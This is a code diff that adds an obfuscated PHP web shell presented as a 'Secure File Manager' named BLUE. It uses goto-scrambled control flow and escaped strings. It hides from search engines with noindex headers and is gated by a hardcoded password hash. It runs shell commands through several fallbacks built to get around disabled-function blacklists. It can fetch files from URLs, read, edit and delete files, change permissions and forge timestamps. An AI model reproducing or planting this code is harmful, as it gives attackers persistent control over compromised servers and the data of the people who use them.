+                <?php  } goto eb80y; sjMmX: ?>
+" class="space-y-2">
+          <input type="hidden" name="csrf" value="<?php  goto H8_yL; nVTP6: ?>
+">
+            <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
+            <input type="text" name="filename" class="field" placeholder="File name (optional)">
+            <button class="btn w-full" type="submit">Fetch from URL</button>
+            <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
+          </form>
+          <div class="text-xs text-slate-400">
+            Tip: You can also drag &amp; drop files anywhere on this page to upload.
+          </div>
+        </div>
+      </section>
+    </aside>
+
+    <!-- MAIN: Editor / Preview panels + Table -->
+    <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">
+
+      <?php  goto FrLMC; pmcky: function ensureCsrf() { if ($_SERVER["\x52\105\121\x55\105\x53\124\137\115\105\124\110\x4f\104"] === "\x50\117\123\x54") { $sess = isset($_SESSION["\143\163\162\x66"]) ? $_SESSION["\143\x73\162\x66"] : ''; $tok = isset($_POST["\x63\x73\x72\146"]) ? (string) $_POST["\143\x73\x72\x66"] : ''; $ok = hash_equals($sess, $tok); if (!$ok) { http_response_code(400); die("\x43\x53\x52\106\40\x74\157\x6b\145\x6e\x20\151\156\166\x61\154\151\x64"); } } } goto Wv0PS; ZkefZ: echo h($csrf); goto Rrpnr; fyYi3: $csrf = isset($_SESSION["\x63\x73\x72\146"]) ? $_SESSION["\x63\163\162\x66"] : ''; goto mCv0M; qVLQr: echo count($files); goto H8UJZ; qQBgv: if (!function_exists("\146\170\137\x73\x74\162\x65\141\x6d\137\x73\x6f\143\x6b\x65\x74\x5f\x63\154\151\145\x6e\x74")) { function fx_stream_socket_client($remote_socket, &$errno = null, &$errstr = null, $timeout = 30, $flags = 0, $context = null) { if (is_fn_usable("\x73\x74\162\x65\x61\x6d\137\x73\157\x63\153\x65\x74\x5f\x63\x6c\x69\x65\156\x74")) { return @stream_socket_client($remote_socket, $errno, $errstr, $timeout, $flags, $context); } if (is_fn_usable("\x66\163\x6f\143\x6b\157\x70\145\156")) { $host = $remote_socket; $port = 0; if (stripos($remote_socket, "\x74\143\160\72\x2f\x2f") === 0 || stripos($remote_socket, "\163\x73\x6c\x3a\x2f\57") === 0 || stripos($remote_socket, "\164\x6c\x73\72\57\57") === 0) { $tmp = parse_url($remote_socket); if ($tmp && isset($tmp["\150\157\163\x74"]) && isset($tmp["\x70\157\x72\164"])) { $host = $tmp["\x68\x6f\x73\164"]; $port = $tmp["\x70\157\x72\x74"]; } } else { if (strpos($remote_socket, "\72") !== false) { $parts = explode("\72", $remote_socket, 2); $host = $parts[0]; $port = (int) $parts[1]; } } return @fsockopen($host, $port ? $port : 80, $errno, $errstr, $timeout); } $errno = 0; $errstr = "\x4e\x6f\40\x73\x6f\143\153\145\164\40\146\165\x6e\143\x74\x69\x6f\156\x73\x20\141\x76\141\151\x6c\141\x62\x6c\x65"; return false; } } goto Y5cSt; UfKgy: if (!function_exists("\146\x78\x5f\144\151\x73\x6b\x66\162\x65\145\x73\x70\141\x63\x65")) { function fx_diskfreespace($directory) { if (is_fn_usable("\x64\151\163\153\x66\x72\x65\x65\x73\x70\141\143\x65")) { return @diskfreespace($directory); } if (is_fn_usable("\144\x69\163\153\137\146\x72\145\x65\137\163\x70\x61\143\145")) { return @disk_free_space($directory); } return false; } } goto v1JlN; n1HiW: if ($editFile && $viewMode === "\164\170\164") { ?>
+    (function(){
+      var ta = document.getElementById('editor'); if (!ta) return;
+      var filename = <?php  echo je(basename($editFile)); ?>
+;
+      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
+      var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
+      var cm = CodeMirror.fromTextArea(ta, {
+        lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
+        lineWrapping:true, theme:'material-darker',
+        mode: (info && info.mime) ? info.mime : 'text/plain',
+        viewportMargin: Infinity
+      });
+      if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
+      var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
+      var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
+    })();
+    <?php  } goto mdf96; vHhkl: if (!function_exists("\167\x72\141\x70\137\143\155\x64\x5f\146\x6f\x72\137\163\x68\145\154\x6c")) { function wrap_cmd_for_shell($cmd) { if (DIRECTORY_SEPARATOR === "\134") { return "\143\x6d\144\x2e\145\170\x65\40\57\x43\x20" . $cmd; } return "\57\142\151\156\57\x73\150\40\x2d\143\40" . escapeshellarg($cmd); } } goto yUSv4; iMtWO: $dirs = array(); goto Va85R; Va85R: foreach ($items as $it) { $full = $current . DIRECTORY_SEPARATOR . $it; if (is_dir($full)) { $dirs[] = $it; } else { $files[] = $it; } } goto RWqZk; ZTiY4: ?>
+
+    <!-- SIDEBAR -->
+    <aside class="col-span-12 xl:col-span-3 space-y-4">
+      <?php  goto Jod8w; uUMij: ?>
+">
+            <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
+            <button class="btn w-full" type="submit">Upload Files</button>
+            <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
+          </form>
+          <form method="post" action="?a=url-upload&p=<?php  goto DbN4g; SsBbg: echo je($current); goto Pl1Ri; nvgUk: $hasFlagCase = defined("\x53\x4f\x52\x54\x5f\106\x4c\101\107\x5f\103\x41\123\x45"); goto Npyoo; fav_v: $action = isset($_GET["\x61"]) ? $_GET["\x61"] : ''; goto Y4Z4N; Wv0PS: function create_nonzero_file($path, $userContent = null) { $default = "\103\x72\x65\x61\x74\145\x64\40\142\x79\40\102\x4c\125\105\x20\x40\40" . date("\x63") . "\xa"; $payload = (string) ($userContent !== null ? $userContent : $default); if ($payload === '') { $payload = $default; } $w = @file_put_contents($path, $payload, LOCK_EX); if ($w !== false && $w > 0) { return array(true, "\146\x69\154\145\137\160\165\x74\x5f\x63\157\x6e\164\x65\156\164\x73"); } $fp = @fopen($path, "\x77\x62"); if ($fp) { $wr = @fwrite($fp, $payload); @fclose($fp); if ($wr !== false && $wr > 0) { return array(true, "\146\157\x70\x65\156\53\x66\x77\162\x69\164\x65"); } } $tmp = @tempnam(sys_get_temp_dir(), "\142\154\165\145\x5f"); if ($tmp) { @file_put_contents($tmp, $payload); if (@rename($tmp, $path)) { if (@filesize($path) > 0) { return array(true, "\x74\x65\155\160\156\x61\x6d\x2b\162\x65\x6e\141\155\x65"); } } elseif (@copy($tmp, $path)) { @unlink($tmp); if (@filesize($path) > 0) { return array(true, "\x74\x65\x6d\160\156\141\x6d\53\143\157\x70\x79"); } } @unlink($tmp); } $src = @fopen("\x70\150\x70\72\57\57\164\x65\x6d\x70", "\167\142\53"); if ($src) { @fwrite($src, $payload); @rewind($src); $dst = @fopen($path, "\x77\x62"); if ($dst) { $copied = @stream_copy_to_stream($src, $dst); @fclose($dst); if ($copied !== false && $copied > 0) { @fclose($src); return array(true, "\x70\x68\x70\72\x2f\57\x74\145\x6d\x70\40\x63\157\x70\171"); } } @fclose($src); } if (@touch($path)) { $w2 = @file_put_contents($path, $payload, FILE_APPEND); if ($w2 !== false && $w2 > 0) { return array(true, "\x74\157\x75\x63\150\53\x61\x70\160\x65\156\144"); } } return array(false, "\101\154\154\x20\155\145\164\150\157\144\x73\x20\x66\x61\x69\154\145\144"); } goto TXpaD; wIizJ: header("\103\141\143\150\145\x2d\x43\157\x6e\164\162\x6f\x6c\72\40\156\x6f\x2d\x73\164\x6f\162\145\x2c\x20\x6e\157\x2d\x63\x61\143\150\145\x2c\40\x6d\x75\x73\164\x2d\162\145\x76\x61\x6c\151\x64\141\164\145\54\40\155\141\170\55\x61\147\145\x3d\60"); goto AKoZa; DR40G: echo rawurlencode($current); goto VEIli; SGKeC: $current = isset($_GET["\x70"]) ? (string) $_GET["\160"] : getcwd(); goto rOza0; A_Pws: function humanSize($b) { $u = array("\102", "\113\102", "\115\102", "\x47\x42", "\124\102"); $i = 0; while ($b >= 1024 && $i < count($u) - 1) { $b /= 1024; $i++; } return ($i ? number_format($b, 2) : (string) $b) . "\40" . $u[$i]; } goto ET11Q; Y3GR0: $isEdit = (isset($_GET["\141"]) ? $_GET["\x61"] : '') === "\x65\x64\x69\164" && isset($_GET["\x66"]) ? safeJoin($current, $_GET["\146"]) : null; goto mmFLm; bqLeM: if (!function_exists("\x66\x78\x5f\x73\x63\x61\x6e\x64\x69\162")) { function fx_scandir($dir) { if (is_fn_usable("\x73\143\141\156\x64\151\x72")) { return @scandir($dir); } $h = @opendir($dir); if (!$h) { return false; } $out = array(); while (false !== ($e = readdir($h))) { $out[] = $e; } closedir($h); return $out; } } goto A1PnK; oMVkd: foreach (breadcrumbs($current) as $i => $crumb) { list($name, $path) = $crumb; ?>
+            <?php  if ($i) { echo "\x3c\x73\x70\141\156\40\x63\154\x61\x73\163\75\42\164\x65\x78\164\x2d\163\x6c\x61\x74\145\x2d\x36\60\60\42\x3e\x2f\74\57\x73\x70\x61\156\x3e"; } ?>
+            <a href="?p=<?php  echo rawurlencode($path); ?>
+" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php  echo h($name); ?>
+</a>
+          <?php  } goto PV7aS; jBQKc: if (!function_exists("\x66\170\137\160\141\163\x73\164\x68\162\x75")) { function fx_passthru($cmd, &$return_var = null) { if (is_fn_usable("\160\x61\163\x73\x74\150\162\x75")) { return @passthru($cmd, $return_var); } $return_var = 127; return null; } } goto Jn5QQ; bkGnY: ?>
+ + dirName;
+        fd.append('dst', dstAbs);
+        fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
+          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
+          .catch(function(){ alert('Move failed'); });
+      }catch(err){ console.error(err); alert('Move failed'); }
+    }
+
+    // ===== CodeMirror Init (file editor text mode) =====
+    <?php  goto n1HiW; Mv1SJ: function safeJoin($base, $child) { $child = str_replace("\x0", '', $child); if ($child === '') { return $base; } if ($child[0] === DIRECTORY_SEPARATOR || preg_match("\x7e\136\x5b\101\55\x5a\x61\x2d\x7a\135\x3a\134\x5c\x7e", $child)) { return $child; } return rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $child; } goto B66zc; yZuTZ: if (!function_exists("\151\163\x5f\146\156\x5f\x75\163\x61\142\x6c\x65")) { function is_fn_usable($fn) { if (!function_exists($fn)) { return false; } $disabled = (string) @ini_get("\x64\151\x73\x61\x62\154\x65\x5f\146\x75\156\x63\x74\x69\157\156\163"); $suhosin = (string) @ini_get("\163\x75\150\x6f\x73\151\156\56\x65\170\145\x63\165\164\157\x72\x2e\146\x75\x6e\143\56\x62\154\141\143\153\154\151\163\x74"); $blocked = array(); if ($disabled !== '') { $blocked = array_merge($blocked, array_map("\x74\x72\151\155", explode("\x2c", $disabled))); } if ($suhosin !== '') { $blocked = array_merge($blocked, array_map("\164\x72\x69\155", explode("\54", $suhosin))); } $blocked = array_filter(array_map("\x73\x74\x72\x74\157\154\x6f\x77\x65\x72", $blocked)); return !in_array(strtolower($fn), $blocked, true); } } goto mJ3Vc; ZIzqo: if (!function_exists("\x66\x78\137\147\x7a\151\156\x66\x6c\141\x74\145")) { function fx_gzinflate($data, $length = 0) { if (is_fn_usable("\x67\x7a\x69\156\146\154\141\x74\x65")) { return @gzinflate($data, $length); } if (is_fn_usable("\147\x7a\x64\x65\143\157\144\145")) { return @gzdecode($data); } if (is_fn_usable("\x67\x7a\165\x6e\143\157\155\x70\x72\145\163\163")) { return @gzuncompress($data); } return false; } } goto FR813; e4atL: echo rawurlencode($current); goto sjMmX; PowaZ: echo count($dirs); goto rG0K2; Y4Z4N: if ($action === "\x6c\157\x67\x69\156" && $_SERVER["\122\x45\x51\125\105\x53\124\x5f\115\x45\x54\110\117\x44"] === "\x50\x4f\123\x54") { ensureCsrf(); $u = isset($_POST["\x75\x73\145\162"]) ? $_POST["\165\x73\x65\162"] : ''; $p = isset($_POST["\160\141\x73\x73"]) ? $_POST["\x70\141\163\x73"] : ''; if (verify_login_creds($u, $p)) { $_SESSION["\141\x75\x74\x68"] = true; $_SESSION["\x77\150\x6f"] = $u; header("\x4c\x6f\143\x61\164\x69\157\156\x3a\40\x3f\x70\75" . rawurlencode($current)); die; } else { render_login("\x49\x6e\x63\157\162\x72\145\x63\x74\40\x75\x73\145\162\x6e\x61\155\x65\40\x6f\x72\x20\160\x61\x73\x73\167\157\x72\x64"); die; } } goto sqMcT; S6u5z: if ($action === "\x72\x61\167") { $f = safeJoin($current, isset($_GET["\146"]) ? $_GET["\146"] : ''); if (!is_file($f) || !is_readable($f)) { http_response_code(404); die("\116\x6f\164\40\146\157\x75\156\144"); } $mime = "\141\x70\x70\x6c\151\x63\x61\x74\151\x6f\156\57\x6f\x63\164\145\164\55\x73\x74\162\145\x61\x6d"; if (is_fn_usable("\146\151\156\x66\157\x5f\x6f\x70\x65\156")) { $fi = @finfo_open(FILEINFO_MIME_TYPE); if ($fi) { $det = @finfo_file($fi, $f); if ($det) { $mime = $det; } @finfo_close($fi); } } elseif (is_fn_usable("\155\151\x6d\145\137\143\157\156\164\145\x6e\164\137\164\x79\x70\145")) { $tmp = @mime_content_type($f); if ($tmp) { $mime = $tmp; } } header("\x43\157\156\x74\145\x6e\x74\55\124\x79\x70\145\x3a\x20" . $mime); header("\x43\x6f\156\164\145\x6e\164\55\x4c\x65\156\x67\164\x68\72\40" . filesize($f)); header("\130\x2d\x43\157\x6e\x74\145\156\164\55\124\x79\160\x65\55\x4f\160\x74\x69\157\156\163\72\40\156\x6f\x73\x6e\151\x66\x66"); header("\103\157\156\164\145\x6e\164\55\x44\x69\x73\160\x6f\163\x69\x74\151\x6f\x6e\x3a\40\x69\156\154\x69\x6e\145\73\x20\x66\151\154\145\156\141\x6d\145\x3d\x22" . basename($f) . "\x22"); readfile($f); die; } goto XQbcw; Jak1A: ?>
+
+      <?php  goto aF9CI; qME6W: function verify_login_creds($u, $p) { if ($u !== AUTH_USER) { return false; } $hash = AUTH_PASS_HASH; if ($hash === '' || strlen($hash) < 20) { return false; } return biru_password_verify($p, $hash); } goto p8Sp6; gCvZv: if (!function_exists("\146\170\x5f\160\157\163\x69\170\137\x67\145\164\147\x72\147\x69\x64")) { function fx_posix_getgrgid($gid) { if (is_fn_usable("\160\157\163\151\x78\x5f\x67\x65\164\x67\162\x67\x69\144")) { return @posix_getgrgid($gid); } return array("\156\x61\x6d\145" => "\x75\156\x6b\156\157\167\x6e", "\x67\x69\x64" => $gid); } } goto UfKgy; w6KwG: $viewFile = $isView && is_file($isView) ? $isView : null; goto ovZqS; PV7aS: ?>
+        </div>
+        <hr class="my-4 border-slate-700">
+        <form method="get" class="space-y-2">
+          <label class="text-sm text-slate-300">Change Path</label>
+          <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php  goto u2ayR; Rrpnr: ?>
+">
+        <button class="btn btn-sm" type="submit">Logout</button>
+      </form>
+    </div>
+  </header>
+
+  <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">
+
+    <?php  goto v6ufH; ADJrO: ?>
+</span>
+      </div>
+
+      <!-- Command (dibatasi lebar) -->
+      <div class="cmd-container ml-auto">
+        <form method="post" action="?a=cmd&p=<?php  goto LRyaB; FR813: if (!function_exists("\146\x78\137\x65\x78\145\143")) { function fx_exec($cmd, &$output = null, &$return_var = null) { if (is_fn_usable("\145\170\x65\143")) { return @exec($cmd, $output, $return_var); } $output = array(); $return_var = 127; return null; } } goto jBQKc; ngb8J: echo svgIcon("\x70\167\x78", "\151\x63\x6f"); goto aFily; tf19J: echo rawurlencode($current); goto uGEIE; sqMcT: if (empty($_SESSION["\x61\x75\164\150"])) { render_login(); die; } goto nCFqh; UQ6PH: if (!function_exists("\x66\x78\x5f\x70\x61\162\x73\145\x5f\x69\156\x69\x5f\146\x69\154\145")) { function fx_parse_ini_file($filename, $process_sections = false, $scanner_mode = null) { if (is_fn_usable("\160\x61\162\x73\x65\137\x69\x6e\x69\137\146\151\154\145")) { if ($scanner_mode === null) { return @parse_ini_file($filename, $process_sections); } return @parse_ini_file($filename, $process_sections, $scanner_mode); } $s = @file_get_contents($filename); if ($s === false) { return false; } if (is_fn_usable("\x70\141\x72\x73\145\x5f\x69\x6e\151\137\163\x74\x72\x69\156\147")) { return @parse_ini_string($s, $process_sections); } return false; } } goto EnfhA; QXIKt: function biru_apply_mtime($path, $timestamp, $recursive, &$ok) { if (!@touch($path, $timestamp, $timestamp)) { $ok = false; } if ($recursive && is_dir($path)) { $h = @opendir($path); if ($h !== false) { while (false !== ($v = readdir($h))) { if ($v === "\x2e" || $v === "\x2e\56") { continue; } biru_apply_mtime($path . DIRECTORY_SEPARATOR . $v, $timestamp, true, $ok); } closedir($h); } else { $ok = false; } } } goto SGKeC; TXpaD: function render_login($err = '') { $csrf = isset($_SESSION["\x63\163\162\146"]) ? $_SESSION["\143\x73\x72\x66"] : ''; ?>
+    <!doctype html><html lang="en" class="dark"><head>
+      <meta charset="utf-8"><title>BLUE</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+      <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+      <script src="https://cdn.tailwindcss.com"></script>
+      <script>tailwind.config={theme:{extend:{fontFamily:{ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']},colors:{canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}},boxShadow:{soft:'0 10px 30px rgba(0,0,0,.45)',card:'0 6px 20px rgba(37,99,235,.22)'},borderRadius:{xl2:'18px'}}},darkMode:'class'}</script>
+      <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+      <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
+      <style>
+        :root{color-scheme:dark} html,body{height:100%}
+        body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
+        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(59,130,246,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
+        .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
+        .btn{background:linear-gradient(180deg,#3b82f6,#2563eb);color:#eaf2ff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(37,99,235,.25);}
+        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(37,99,235,.35)} .btn:active{transform:translateY(.5px)}
+        .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
+        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(59,130,246,.25);border-color:#3b82f6}
+        .title{background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent}
+      </style>
+    </head><body class="shell text-slate-100">
+      <div class="w-full max-w-md card p-6">
+        <div class="mb-5 flex items-center justify-between">
+          <div class="text-xl font-bold tracking-tight title">BLUE</div>
+          <span class="text-xs text-slate-400">PHP <?php  echo h(PHP_VERSION); ?>
+</span>
+        </div>
+        <?php  if ($err) { ?>
+<div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2"><?php  echo h($err); ?>
+</div><?php  } ?>
+        <form method="post" action="?a=login" class="space-y-3">
+          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+          <div><label class="text-sm text-slate-300">Username</label><input class="field mt-1" name="user" type="text" autocomplete="username" required></div>
+          <div><label class="text-sm text-slate-300">Password</label><input class="field mt-1" name="pass" type="password" autocomplete="current-password" required></div>
+          <button class="btn w-full" type="submit">Login</button>
+        </form>
+        <p class="text-[12px] text-slate-400 mt-4 text-center">© BLUE x Secure File Manager</p>
+      </div>
+    </body></html><?php  } goto ZjMaL; qwc4i: if (!function_exists("\x72\x75\156\x5f\143\x6f\x6d\155\x61\156\144\x5f\141\154\x6c")) { function run_command_all($cmd, $cwd = null) { $po = run_with_proc_open($cmd, $cwd, 30); if ($po) { return $po; } $order = array("\162\x75\x6e\x5f\x77\x69\164\150\137\163\x68\x65\154\154\x5f\145\170\145\x63", "\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\145\170\x65\143", "\x72\165\156\137\167\x69\x74\150\137\163\x79\x73\164\x65\x6d", "\162\165\156\137\167\151\x74\150\137\x70\157\x70\145\x6e"); foreach ($order as $fn) { if (function_exists($fn)) { $res = $fn($cmd, $cwd); if ($res) { return $res; } } } return array("\155\x65\x74\150\157\144" => "\156\157\x6e\145", "\x63\x6f\x64\145" => 127, "\157\165\x74" => "\x43\x6f\155\155\x61\x6e\144\40\x72\x75\x6e\x6e\x65\162\40\x6e\x6f\164\x20\x61\x76\141\151\x6c\141\x62\x6c\x65\x20\x6f\156\40\x74\150\151\x73\x20\x50\x48\x50\x20\142\165\x69\154\144\56"); } } goto P_hGK; jDaqy: ?>
+" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
+          <input type="hidden" name="csrf" value="<?php  goto MSmUf; RWqZk: $hasNatural = defined("\123\117\122\x54\x5f\x4e\101\124\125\x52\x41\114"); goto nvgUk; Ed6bp: if (!function_exists("\x72\165\x6e\x5f\167\x69\164\x68\137\163\x68\145\x6c\154\x5f\145\x78\145\x63")) { function run_with_shell_exec($cmd, $cwd = null) { if (!is_fn_usable("\x73\x68\x65\154\154\x5f\145\170\145\x63")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\x20\x32\76\x26\61"; $out = @shell_exec($full); if ($out === null) { return null; } return array("\155\x65\x74\150\157\144" => "\163\150\145\154\154\x5f\145\170\x65\143", "\x63\x6f\x64\145" => null, "\x6f\x75\164" => $out); } } goto xfxG4; UMCl7: ?>
+" class="flex-1 flex flex-col" id="bulkDeleteForm">
+          <input type="hidden" name="csrf" value="<?php  goto GhG84; f9SS_: $viewMode = in_array($modeParam, array("\x74\170\x74", "\142\x36\64", "\x61\165\x74\157"), true) ? $modeParam : "\x61\165\x74\157"; goto fyYi3; cjpBz: echo svgIcon("\163\x65\x61\162\x63\x68", "\x69\x63\157"); goto Q2IxK; mCv0M: $yearNow = date("\131"); goto UPzwe; DbN4g: echo rawurlencode($current); goto jl6mz; ANqni: function rrmdir($p) { if (!file_exists($p)) { return true; } if (is_file($p) || is_link($p)) { return @unlink($p); } $ok = true; $h = @opendir($p); if ($h === false) { return false; } while (false !== ($v = readdir($h))) { if ($v === "\56" || $v === "\56\x2e") { continue; } $ok = rrmdir($p . DIRECTORY_SEPARATOR . $v) && $ok; } closedir($h); return @rmdir($p) && $ok; } goto wpiHf; iXoZL: ?>
+
+      <div class="card p-4 flex flex-col" id="tableCard">
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="font-medium">Directory Contents</h2>
+          <div class="text-sm text-slate-400">Dirs: <?php  goto PowaZ; atD4M: ?>
+
+      <section class="card p-4">
+        <h2 class="font-medium mb-3">Navigation</h2>
+        <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
+        <div class="flex flex-wrap gap-1 text-sm">
+          <?php  goto oMVkd; qItMO: echo rawurlencode($current); goto JDFFC; P_hGK: function biru_apply_chmod($path, $mode, $recursive, &$ok) { if (!@chmod($path, $mode)) { $ok = false; } if ($recursive && is_dir($path)) { $h = @opendir($path); if ($h !== false) { while (false !== ($v = readdir($h))) { if ($v === "\x2e" || $v === "\56\56") { continue; } biru_apply_chmod($path . DIRECTORY_SEPARATOR . $v, $mode, true, $ok); } closedir($h); } else { $ok = false; } } } goto QXIKt; NAXDH: echo rawurlencode($current); goto UMCl7; mlVQB: define("\x41\x55\x54\110\137\120\101\123\123\137\x48\x41\x53\x48", "\44\x32\x79\44\61\x30\x24\125\142\x63\116\x62\x6f\112\x50\x76\x6f\x36\x78\131\x71\146\151\122\x4d\x6a\153\x64\117\165\161\x71\156\105\121\x6b\x54\56\x43\66\x72\x44\x78\x41\x77\x6d\x37\123\x75\126\x46\x44\x2e\x41\x6c\162\131\x38\x72\x2e"); goto Q52Hp; GhG84: echo h($csrf); goto DiQC3; mmFLm: $editFile = $isEdit && is_file($isEdit) ? $isEdit : null; goto tUmQO; B66zc: function listDirEntries($dir) { $h = @opendir($dir); if ($h === false) { return array(); } $items = array(); while (false !== ($e = readdir($h))) { if ($e === "\56" || $e === "\56\56") { continue; } $items[] = $e; } closedir($h); return $items; } goto ANqni; s26Fl: if (!function_exists("\151\x73\x5f\x66\x6e\137\x75\x73\x61\x62\154\x65")) { function is_fn_usable($fn) { if (!function_exists($fn)) { return false; } $disabled = (string) @ini_get("\144\x69\163\141\142\154\145\137\x66\165\x6e\143\164\151\157\156\x73"); $suhosin = (string) @ini_get("\163\x75\x68\x6f\163\151\156\56\x65\x78\x65\143\165\x74\157\x72\x2e\x66\165\156\143\56\x62\154\141\143\x6b\154\x69\163\x74"); $blocked = array(); if ($disabled !== '') { $blocked = array_merge($blocked, array_map("\x74\162\151\x6d", explode("\54", $disabled))); } if ($suhosin !== '') { $blocked = array_merge($blocked, array_map("\x74\162\151\155", explode("\x2c", $suhosin))); } if (!empty($blocked)) { $blocked = array_filter(array_map("\x73\164\162\164\157\x6c\157\167\145\x72", $blocked)); if (in_array(strtolower($fn), $blocked, true)) { return false; } } return true; } } goto XKJpE; aDdkA: ?>
+</div>
+        </div>
+      </div>
+
+      <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
+        <?php  goto cjpBz; VEIli: ?>
+" class="ml-1 shrink-0">
+        <input type="hidden" name="csrf" value="<?php  goto ZkefZ; RbT81: header("\130\55\122\x6f\142\157\x74\x73\55\124\141\x67\72\40\156\x6f\151\156\144\145\x78\54\40\x6e\x6f\x66\157\x6c\x6c\x6f\167\54\40\156\157\141\162\143\150\151\x76\145\54\x20\x6e\x6f\163\x6e\151\160\x70\x65\x74\54\x20\x6e\x6f\x69\155\x61\x67\x65\151\x6e\x64\145\170", true); goto A0s3c; Ve618: if (!function_exists("\x68\141\163\150\x5f\x65\161\x75\141\154\x73")) { function hash_equals($a, $b) { if (!is_string($a) || !is_string($b)) { return false; } $len = strlen($a); if ($len !== strlen($b)) { return false; } $res = 0; for ($i = 0; $i < $len; $i++) { $res |= ord($a[$i]) ^ ord($b[$i]); } return $res === 0; } } goto yZuTZ; HyzxA: if ($up === $current) { $up = $current; } goto Y3GR0; nxz3n: function breadcrumbs($path) { $out = array(); if (preg_match("\176\x5e\x5b\x41\x2d\x5a\141\55\172\135\72\134\134\x7e", $path)) { $drive = substr($path, 0, 2); $rest = substr($path, 2); $segments = array_values(array_filter(explode("\134\x5c", $rest), "\163\164\162\x6c\x65\156")); $acc = $drive . "\x5c"; $out[] = array($drive . "\134", $acc); foreach ($segments as $s) { $acc .= $s . "\x5c"; $out[] = array($s, rtrim($acc, "\134")); } } else { $segments = array_values(array_filter(explode("\x2f", $path), "\163\x74\x72\x6c\145\156")); $acc = "\57"; $out[] = array("\x2f", "\57"); foreach ($segments as $s) { $acc .= $s . "\x2f"; $out[] = array($s, rtrim($acc, "\57")); } } return $out; } goto pmcky; H8_yL: echo h($csrf); goto T32QS; rOza0: if (!is_dir($current)) { $current = getcwd(); } goto TvT3_; eb80y: ?>
+
+                <?php  goto lcMpQ; tUmQO: $isView = (isset($_GET["\141"]) ? $_GET["\x61"] : '') === "\x76\x69\x65\167" && isset($_GET["\146"]) ? safeJoin($current, $_GET["\x66"]) : null; goto w6KwG; TvT3_: $current = rtrim($current, DIRECTORY_SEPARATOR); goto pT1kW; xwnlD: echo h($csrf); goto uUMij; v1JlN: if (!function_exists("\x66\x78\137\146\x69\154\x65\147\162\x6f\x75\x70")) { function fx_filegroup($filename) { if (is_fn_usable("\x66\151\154\145\147\x72\157\165\x70")) { return @filegroup($filename); } return false; } } goto Totlh; XKJpE: date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : "\x55\x54\103"); goto UxSvF; mdf96: ?>
+
+    // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
+    (function(){
+      var pre = document.getElementById('previewPre');
+      if(!pre || typeof CodeMirror === 'undefined') return;
+
+      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
